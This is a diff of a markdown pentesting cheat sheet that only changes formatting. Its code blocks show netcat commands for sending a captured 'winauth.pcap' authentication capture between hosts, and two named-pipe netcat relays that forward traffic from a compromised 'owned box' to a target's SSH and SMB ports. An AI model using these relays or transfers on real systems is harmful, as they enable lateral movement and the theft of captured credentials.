@@ -6,7 +6,7 @@
 
 #### listener send winauth.pcap to windows in this case
 
-```text
+```
 nc -lnvp 2222 < winauth.pcap
 nc.exe -nvvv -w 3 10.10.75.122 2222 > /tmp/winauth.pcap
 ```
@@ -17,19 +17,17 @@ nc.exe -nvvv -w 3 10.10.75.122 2222 > /tmp/winauth.pcap
 
 ### Relay
 
-```text
+```
 mknod polo p 
 nc -lnvp 33333 0<polo | nc TARGET 22 1>polo
 ```
 
-### Netcat relay on owned Box 
+### Netcat relay on owned Box&#x20;
 
-```text
+```
 cd /tmp
 mknod whatever p
 nc -lvnp 4545 0</tmp/whatever | nc TARGET 445 | tee /tmp/whatever
 ```
 
-  
-
-
+\
